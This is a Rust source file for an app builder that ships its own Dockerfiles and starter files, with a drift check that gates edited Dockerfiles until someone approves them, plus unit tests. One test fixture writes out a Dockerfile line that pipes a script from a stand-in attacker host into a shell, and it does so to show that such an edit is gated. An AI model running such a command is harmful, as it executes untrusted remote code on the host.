//! The Dockerfiles aichip owns.
//!
//! An agent writing an app picks a runtime and writes application code; it does
//! not write the build. That inversion is deliberate, for three reasons:
//!
//! * **Nobody reads the fifth agent-written Dockerfile carefully.** A gate
//!   people click through is worse than no gate, because it manufactures
//!   consent. Owning the common case means the gate only ever appears when
//!   something genuinely differs.
//! * **Rebuild time is the dominant cost of containerised apps.** Every edit
//!   rebuilds. A shared base means a warm layer cache and a rebuild measured in
//!   seconds; a bespoke Dockerfile per app means a cold one and minutes.
//! * It composes with the CSP. `connect-src 'self'` assumes dependencies are
//!   vendored, and a Dockerfile aichip wrote is one that can guarantee it.
//!
//! The text is still committed to the app's repository, so the project stands
//! alone — aichip simply builds from its own copy of the same thing. When the
//! two differ, [`drift`] says so and the app is gated until a person has read
//! what it now says.

use super::manifest::Runtime;

/// A static site: whatever the app built, served by nginx.
///
/// `EXPOSE` is literal because `previews::recipe::exposed_port` reads exactly
/// that line, and a port it has to guess at travels all the way to the UI as
/// "assumed".
const STATIC_DOCKERFILE: &str = r#"# Written by aichip. Edit it and aichip will ask you to approve the change.
FROM nginx:1.27-alpine
COPY . /usr/share/nginx/html
EXPOSE 80
"#;

/// A Node server. Dependencies are installed at build time and nothing is
/// fetched at run time, which is what makes `connect-src 'self'` honest.
const NODE_DOCKERFILE: &str = r#"# Written by aichip. Edit it and aichip will ask you to approve the change.
FROM node:22-alpine
WORKDIR /app

# Dependencies first, so a change to the source does not reinstall them. This
# is the layer that makes a rebuild seconds rather than minutes.
COPY package*.json ./
RUN npm install --omit=dev --no-audit --no-fund

COPY . .
ENV NODE_ENV=production
ENV PORT=3000
EXPOSE 3000
CMD ["node", "server.js"]
"#;

/// A minimal Node app: an http server and the manifest the Dockerfile copies.
///
/// `PORT` rather than a literal 3000 because the Dockerfile sets it and a
/// future one may set something else; an app that reads it keeps working.
const NODE_SERVER: &str = r#"// Replace this with your app. aichip builds and serves whatever is here.
//
// Two things this file has to keep doing:
//   * listen on process.env.PORT — that is the port aichip proxies to
//   * fetch nothing from the internet at run time — the page's CSP is
//     connect-src 'self', so dependencies belong in package.json
const http = require("node:http");

const server = http.createServer((req, res) => {
  res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
  res.end(`<!doctype html>
<meta charset="utf-8">
<title>New app</title>
<body style="font: 15px system-ui; margin: 3rem; color: #333">
  <h1>This app has no pages yet.</h1>
  <p>Ask aichip to change it, or edit <code>server.js</code>.</p>
</body>`);
});

server.listen(process.env.PORT || 3000);
"#;

const NODE_PACKAGE: &str = r#"{
  "name": "aichip-app",
  "private": true,
  "version": "0.1.0",
  "main": "server.js",
  "dependencies": {}
}
"#;

const STATIC_INDEX: &str = r#"<!doctype html>
<meta charset="utf-8">
<title>New app</title>
<body style="font: 15px system-ui; margin: 3rem; color: #333">
  <h1>This app has no pages yet.</h1>
  <p>Ask aichip to change it, or edit <code>index.html</code>.</p>
</body>
"#;

/// The files a container app is created with.
///
/// It exists so that an app that installs is an app that *builds* — the same
/// reasoning that has `install` reconcile the schema rather than waiting for
/// first use. Without it a `runtime: node` app's folder holds only a manifest,
/// and `COPY package*.json ./` fails the build outright, because a `COPY` whose
/// pattern matches nothing is an error rather than a no-op.
///
/// Deliberately dependency-free and deliberately dull. This is a floor an agent
/// replaces, not a framework someone has to learn to delete.
pub fn starter(runtime: Runtime) -> &'static [(&'static str, &'static str)] {
    match runtime {
        Runtime::Module => &[],
        Runtime::Node => &[("package.json", NODE_PACKAGE), ("server.js", NODE_SERVER)],
        Runtime::Static => &[("index.html", STATIC_INDEX)],
    }
}

/// The paths this runtime's Dockerfile needs to find.
///
/// Named separately from [`starter`] so the test below can check one against
/// the other: the invariant is that the tree aichip creates satisfies the
/// Dockerfile aichip wrote, and a rule stated once in two places drifts.
pub fn required_files(runtime: Runtime) -> &'static [&'static str] {
    match runtime {
        Runtime::Module => &[],
        // `COPY . /usr/share/nginx/html` matches anything, but nginx serving a
        // directory with no index is a 403 rather than a page, which is worse
        // than a build failure because it looks like the app is broken.
        Runtime::Static => &["index.html"],
        Runtime::Node => &["package.json", "server.js"],
    }
}

/// The Dockerfile aichip builds this runtime from.
///
/// `None` for a module, which has no container at all.
pub fn dockerfile(runtime: Runtime) -> Option<&'static str> {
    match runtime {
        Runtime::Module => None,
        Runtime::Static => Some(STATIC_DOCKERFILE),
        Runtime::Node => Some(NODE_DOCKERFILE),
    }
}

/// The port the runtime's Dockerfile exposes.
pub fn port(runtime: Runtime) -> Option<u16> {
    match runtime {
        Runtime::Module => None,
        Runtime::Static => Some(80),
        Runtime::Node => Some(3000),
    }
}

/// What a build should use, and whether a person has to read it first.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Build {
    /// aichip's own text, unchanged. Nothing to approve.
    Owned(&'static str),
    /// The repository's copy differs from ours. It is what will be built, and
    /// `sha` is what an approval attaches to.
    Drifted { text: String, sha: String },
    /// This runtime does not build a container.
    None,
}

/// Compare the committed Dockerfile with the runtime's own.
///
/// Whitespace-insensitive at the ends only. Anything more forgiving would mean
/// deciding that some changes to a file whose `RUN` lines execute on this
/// machine do not count, and there is no version of that judgement worth making.
pub fn drift(runtime: Runtime, committed: Option<&str>) -> Build {
    let Some(ours) = dockerfile(runtime) else {
        return Build::None;
    };
    match committed {
        // Absent is not drift: aichip writes its own copy in on the next build,
        // and there is nothing for a person to have an opinion about.
        None => Build::Owned(ours),
        Some(text) if text.trim() == ours.trim() => Build::Owned(ours),
        Some(text) => Build::Drifted {
            sha: super::digest(text.trim()),
            text: text.to_string(),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::previews::recipe;

    #[test]
    fn every_runtime_dockerfile_is_one_the_preview_builder_understands() {
        // A genuine cross-module invariant, checked against the code that will
        // actually read it rather than against a copy of the rule. If the port
        // came back "assumed", a blank page would have no explanation.
        for runtime in [Runtime::Static, Runtime::Node] {
            let text = dockerfile(runtime).expect("a container runtime has a Dockerfile");
            let plan = recipe::plan(Some(text)).expect("the preview builder must accept it");
            assert_eq!(
                plan.source,
                recipe::PortSource::Exposed,
                "{runtime:?} must EXPOSE a literal port, not leave it to be guessed"
            );
            assert_eq!(
                plan.number,
                port(runtime).unwrap(),
                "{runtime:?} says one port and its Dockerfile exposes another"
            );
            assert!(text.contains("FROM "), "{runtime:?} has no base image");
        }
    }

    #[test]
    fn a_module_has_no_container() {
        assert_eq!(dockerfile(Runtime::Module), None);
        assert_eq!(port(Runtime::Module), None);
        assert_eq!(drift(Runtime::Module, Some("FROM scratch")), Build::None);
        assert!(starter(Runtime::Module).is_empty());
        assert!(required_files(Runtime::Module).is_empty());
    }

    #[test]
    fn the_starter_tree_satisfies_the_dockerfile_that_will_build_it() {
        // The bug this pins: `COPY package*.json ./` fails the build when
        // nothing matches, so an app installed with nothing but a manifest
        // could never be run at all. Checked against `required_files` rather
        // than by parsing COPY lines, because the point is that the two
        // answers agree.
        for runtime in [Runtime::Static, Runtime::Node] {
            let files = starter(runtime);
            for needed in required_files(runtime) {
                assert!(
                    files.iter().any(|(name, _)| name == needed),
                    "a new {runtime:?} app has no {needed}, so its first build would fail"
                );
            }
            for (name, body) in files {
                assert!(!body.trim().is_empty(), "{runtime:?}'s {name} is empty");
            }
        }
    }

    #[test]
    fn every_copy_in_a_dockerfile_can_find_something() {
        // The other direction: a COPY naming a specific path has to be a path
        // the starter provides. `COPY . …` matches the folder itself and is
        // always satisfiable.
        for runtime in [Runtime::Static, Runtime::Node] {
            let text = dockerfile(runtime).unwrap();
            for line in text.lines().filter(|l| l.starts_with("COPY ")) {
                let source = line.split_whitespace().nth(1).unwrap();
                if source == "." {
                    continue;
                }
                // `package*.json` is satisfied by `package.json`.
                let stem = source.split(['*', '.']).next().unwrap();
                assert!(
                    required_files(runtime).iter().any(|f| f.starts_with(stem)),
                    "{runtime:?}'s Dockerfile copies {source}, which nothing guarantees exists"
                );
            }
        }
    }

    #[test]
    fn the_node_starter_listens_on_the_port_it_is_given() {
        // A server hardcoding 3000 works until the Dockerfile's ENV changes,
        // and then serves nothing with no error to read.
        let files = starter(Runtime::Node);
        let server = files.iter().find(|(n, _)| *n == "server.js").unwrap().1;
        assert!(server.contains("process.env.PORT"));

        let package = files.iter().find(|(n, _)| *n == "package.json").unwrap().1;
        let parsed: serde_json::Value =
            serde_json::from_str(package).expect("package.json has to be JSON npm can read");
        assert_eq!(parsed["main"], "server.js", "npm and the Dockerfile must agree on the entry");
        // Nothing to fetch is what makes `connect-src 'self'` honest, and it
        // also means the first build does not need a network.
        assert_eq!(parsed["dependencies"].as_object().unwrap().len(), 0);
    }

    #[test]
    fn an_unchanged_or_absent_dockerfile_is_not_a_question() {
        let ours = dockerfile(Runtime::Node).unwrap();
        assert_eq!(drift(Runtime::Node, None), Build::Owned(ours));
        assert_eq!(drift(Runtime::Node, Some(ours)), Build::Owned(ours));
        // Trailing whitespace is not an edit anyone meant.
        assert_eq!(
            drift(Runtime::Node, Some(&format!("\n{ours}  \n"))),
            Build::Owned(ours)
        );
    }

    #[test]
    fn an_edited_dockerfile_is_gated_on_its_own_text() {
        let edited = "FROM node:22-alpine\nRUN curl evil.example | sh\nEXPOSE 3000\n";
        match drift(Runtime::Node, Some(edited)) {
            Build::Drifted { text, sha } => {
                assert_eq!(text, edited);
                // The hash is of the text, so approving one version does not
                // bless the next — the same rule as a preview recipe.
                assert_eq!(sha, crate::apps::digest(edited.trim()));
                assert_ne!(sha, crate::apps::digest("FROM node:22-alpine\n"));
            }
            other => panic!("an edit must be gated, got {other:?}"),
        }
    }

    #[test]
    fn the_node_image_installs_before_it_copies_the_source() {
        // The layer ordering that makes a rebuild seconds instead of minutes,
        // which is the dominant cost of containerised apps.
        let text = dockerfile(Runtime::Node).unwrap();
        let install = text.find("npm install").unwrap();
        let copy_all = text.find("COPY . .").unwrap();
        assert!(install < copy_all, "a source edit would reinstall every dependency");
    }
}
